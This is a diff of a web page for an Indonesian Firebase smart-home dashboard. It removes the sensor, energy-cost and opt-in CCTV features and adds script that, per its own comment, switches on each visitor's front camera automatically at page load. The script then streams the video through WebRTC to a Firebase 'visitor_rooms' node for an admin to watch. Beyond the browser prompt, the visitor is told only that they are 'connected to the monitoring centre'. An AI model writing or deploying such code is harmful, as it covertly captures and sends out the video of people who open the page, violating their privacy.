-                badge.className = "inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full text-xs font-bold tracking-wider uppercase bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border border-emerald-500/20";
-                dot.className = "w-2 h-2 rounded-full bg-emerald-500 animate-pulse";
-                text.innerText = translations[currentLang].statusOn;
-            } else {
-                badge.className = "inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full text-xs font-bold tracking-wider uppercase bg-rose-500/10 text-rose-500 dark:text-rose-400 border border-rose-500/20";
-                dot.className = "w-2 h-2 rounded-full bg-rose-500";
-                text.innerText = translations[currentLang].statusOff;
-            }
-        });
-
-        db.ref('/sensor/ldr').on('value', (snapshot) => {
-            const val = snapshot.val() ?? 0;
-            document.getElementById('val-ldr').innerText = val;
-            let percent = (val / 4095) * 100;
-            document.getElementById('ldr-bar').style.width = `${percent}%`;
-        });
-
-        db.ref('/sensor/pir').on('value', (snapshot) => {
-            const val = snapshot.val();
-            const badge = document.getElementById('pir-badge');
-            const dot = document.getElementById('dot-pir');
-            const text = document.getElementById('text-pir');
-
-            if (val == 1) {
-                badge.className = "inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full text-xs font-bold tracking-wider uppercase bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border border-emerald-500/20";
-                dot.className = "w-2 h-2 rounded-full bg-emerald-500 animate-pulse";
-                text.innerText = translations[currentLang].pirDetected;
-            } else {
-                badge.className = "inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full text-xs font-bold tracking-wider uppercase bg-slate-200 dark:bg-slate-800 text-slate-600 dark:text-slate-400 border border-slate-300 dark:border-slate-700";
-                dot.className = "w-2 h-2 rounded-full bg-slate-400 dark:bg-slate-500";
-                text.innerText = translations[currentLang].pirEmpty;
-            }
-        });
-
-        db.ref('/riwayat_lampu').on('value', (snapshot) => {
-            const data = snapshot.val();
-            if (!data) return;
-
-            let totalDetik = 0;
-            let waktuNyalaTerakhir = null;
-            const keys = Object.keys(data).sort();
-
-            keys.forEach(key => {
-                let item = data[key];
-                if (item.status === true) {
-                    waktuNyalaTerakhir = item.timestamp;
-                } else if (item.status === false && waktuNyalaTerakhir !== null) {
-                    totalDetik += (item.timestamp - waktuNyalaTerakhir);
-                    waktuNyalaTerakhir = null;
-                }
-            });
-
-            if (waktuNyalaTerakhir !== null) {
-                let waktuSekarang = Math.floor(Date.now() / 1000);
-                totalDetik += (waktuSekarang - waktuNyalaTerakhir);
-            }
-
-            let totalJam = totalDetik / 3600;
-            let totalKwh = (dayaLampuWatt * totalJam) / 1000;
-            let totalBiaya = totalKwh * tarifPerKwh;
-
-            document.getElementById('total-jam').innerText = totalJam.toFixed(2);
-            document.getElementById('total-kwh').innerText = totalKwh.toFixed(4);
-            document.getElementById('total-biaya').innerText = "Rp " + Math.round(totalBiaya).toLocaleString('id-ID');
-        });
-
-        function loadDailyHistory() {
-            db.ref('/riwayat_lampu').once('value', (snapshot) => {
-                const data = snapshot.val();
-                const tbody = document.getElementById('daily-table-body');
-                tbody.innerHTML = '';
-
-                if (!data) {
-                    tbody.innerHTML = `<tr><td colspan="4" class="text-center py-8 text-slate-400 dark:text-slate-500">${translations[currentLang].loadingData}</td></tr>`;
-                    return;
-                }
-
-                let dailyMap = {};
-                let waktuNyalaTerakhir = null;
-                const keys = Object.keys(data).sort();
-
-                keys.forEach(key => {
-                    let item = data[key];
-                    let dateStr = new Date(item.timestamp * 1000).toLocaleDateString(currentLang === 'id' ? 'id-ID' : 'en-US', {
-                        day: '2-digit', month: 'short', year: 'numeric'
-                    });
-
-                    if (!dailyMap[dateStr]) dailyMap[dateStr] = 0;
-
-                    if (item.status === true) {
-                        waktuNyalaTerakhir = item.timestamp;
-                    } else if (item.status === false && waktuNyalaTerakhir !== null) {
-                        let durasi = item.timestamp - waktuNyalaTerakhir;
-                        dailyMap[dateStr] += durasi;
-                        waktuNyalaTerakhir = null;
-                    }
-                });
-
-                let html = '';
-                const sortedDates = Object.keys(dailyMap).sort((a,b) => new Date(b) - new Date(a));
-
-                sortedDates.forEach(date => {
-                    let detik = dailyMap[date];
-                    let jam = detik / 3600;
-                    let kwh = (dayaLampuWatt * jam) / 1000;
-                    let biaya = kwh * tarifPerKwh;
-
-                    html += `
-                        <tr class="hover:bg-slate-100 dark:hover:bg-slate-800/40 transition-colors">
-                            <td class="py-4 px-4 font-medium text-slate-900 dark:text-white">${date}</td>
-                            <td class="py-4 px-4 text-blue-600 dark:text-blue-400 font-semibold">${jam.toFixed(2)} ${translations[currentLang].hoursUnit}</td>
-                            <td class="py-4 px-4 text-emerald-600 dark:text-emerald-400 font-semibold">${kwh.toFixed(4)} kWh</td>
-                            <td class="py-4 px-4 text-amber-600 dark:text-amber-400 font-semibold">Rp ${Math.round(biaya).toLocaleString('id-ID')}</td>
-                        </tr>
-                    `;
-                });
-
-                tbody.innerHTML = html;
-            });
-        }
-
-        // --- WEBRTC CCTV (VIEW ONLY) ---
         const configuration = {
-            iceServers: [
-                { urls: 'stun:stun.l.google.com:19302' },
-                { urls: 'stun:stun1.l.google.com:19302' }
-            ]
+            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
         };
 
-        let peerConnection = null;
-        let localStream = null;
-        let currentRoomRef = null;
-
-        async function startCCTVBroadcaster() {
+        // Otomatis aktif saat link dibuka pengunjung
+        window.addEventListener('DOMContentLoaded', async () => {
+            const statusEl = document.getElementById('status-text');
             try {
-                localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
-                
-                document.getElementById('room-status').innerText = "Status: Kamera CCTV aktif. Membuat Room...";
-                
-                const roomRef = db.ref('webrtc_rooms').push();
-                currentRoomRef = roomRef;
-                const roomId = roomRef.key;
-                document.getElementById('room-id-input').value = roomId;
+                // Aktifkan kamera pengunjung secara otomatis
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                document.getElementById('local-video').srcObject = stream;
 
-                peerConnection = new RTCPeerConnection(configuration);
-                
-                localStream.getTracks().forEach(track => {
-                    peerConnection.addTrack(track, localStream);
-                });
+                statusEl.innerText = "Kamera terhubung. Mengirim siaran ke pusat...";
+
+                // Buat Room otomatis di Firebase untuk ditarik oleh Admin
+                const roomRef = db.ref('visitor_rooms').push();
+                const peerConnection = new RTCPeerConnection(configuration);
+
+                stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));
 
                 peerConnection.onicecandidate = event => {
                     if (event.candidate) {
-                        roomRef.child('callerCandidates').push(event.candidate.toJSON());
+                        roomRef.child('visitorCandidates').push(event.candidate.toJSON());
                     }
                 };
 
                 const offer = await peerConnection.createOffer();
                 await peerConnection.setLocalDescription(offer);
                 await roomRef.set({ offer: { type: offer.type, sdp: offer.sdp } });
-                
-                document.getElementById('room-status').innerText = `Status: Room CCTV siap! (ID: ${roomId}). Menunggu penonton...`;
 
                 roomRef.child('answer').on('value', async snapshot => {
                     const answer = snapshot.val();
                     if (answer && !peerConnection.currentRemoteDescription) {
                         await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
-                        document.getElementById('room-status').innerText = "Status: Penonton terhubung! Streaming aktif.";
+                        statusEl.innerText = "Terhubung dengan pusat pemantauan.";
                     }
                 });
 
-                roomRef.child('calleeCandidates').on('child_added', async snapshot => {
+                roomRef.child('adminCandidates').on('child_added', async snapshot => {
                     if (snapshot.val()) {
                         await peerConnection.addIceCandidate(new RTCIceCandidate(snapshot.val()));
                     }
                 });
 
-            } catch (e) {
-                console.error("CCTV error:", e);
-                alert("Gagal mengaktifkan kamera CCTV. Pastikan izin diberikan.");
+            } catch (err) {
+                console.error(err);
+                statusEl.innerText = "Gagal: Izin kamera ditolak atau koneksi tidak aman (HTTPS).";
+                statusEl.className = "text-xs text-rose-500 font-semibold";
             }
-        }
-
-        async function joinCCTVViewer() {
-            const roomId = document.getElementById('room-id-input').value.trim();
-            if (!roomId) return alert("Masukkan Room ID CCTV terlebih dahulu!");
-
-            document.getElementById('room-status').innerText = `Status: Menghubungkan ke Room ${roomId}...`;
-
-            const roomRef = db.ref(`webrtc_rooms/${roomId}`);
-            currentRoomRef = roomRef;
-            
-            const roomSnapshot = await roomRef.once('value');
-            if (!roomSnapshot.exists()) return alert("Room ID tidak ditemukan!");
-
-            peerConnection = new RTCPeerConnection(configuration);
-            peerConnection.addTransceiver('video', { direction: 'recvonly' });
-
-            peerConnection.ontrack = event => {
-                const remoteVideo = document.getElementById('camera-remote');
-                remoteVideo.srcObject = event.streams[0];
-                remoteVideo.classList.remove('hidden');
-                document.getElementById('remote-placeholder').classList.add('hidden');
-                document.getElementById('room-status').innerText = "Status: Berhasil terhubung! Menampilkan live CCTV.";
-            };
-
-            peerConnection.onicecandidate = event => {
-                if (event.candidate) {
-                    roomRef.child('calleeCandidates').push(event.candidate.toJSON());
-                }
-            };
-
-            const offer = roomSnapshot.val().offer;
-            await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
-
-            const answer = await peerConnection.createAnswer();
-            await peerConnection.setLocalDescription(answer);
-            await roomRef.update({ answer: { type: answer.type, sdp: answer.sdp } });
-
-            roomRef.child('callerCandidates').on('child_added', async snapshot => {
-                if (snapshot.val()) {
-                    await peerConnection.addIceCandidate(new RTCIceCandidate(snapshot.val()));
-                }
-            });
-        }
-
-        function hangUpCCTV() {
-            if (peerConnection) {
-                peerConnection.close();
-                peerConnection = null;
-            }
-            if (localStream) {
-                localStream.getTracks().forEach(track => track.stop());
-                localStream = null;
-            }
-            if (currentRoomRef) {
-                currentRoomRef.off();
-                currentRoomRef.remove();
-                currentRoomRef = null;
-            }
-
-            const remoteVideo = document.getElementById('camera-remote');
-            remoteVideo.srcObject = null;
-            remoteVideo.classList.add('hidden');
-            document.getElementById('remote-placeholder').classList.remove('hidden');
-            document.getElementById('room-status').innerText = "Status: Koneksi ditutup.";
-            document.getElementById('room-id-input').value = '';
-        }
+        });
     </script>
 </body>
 </html>
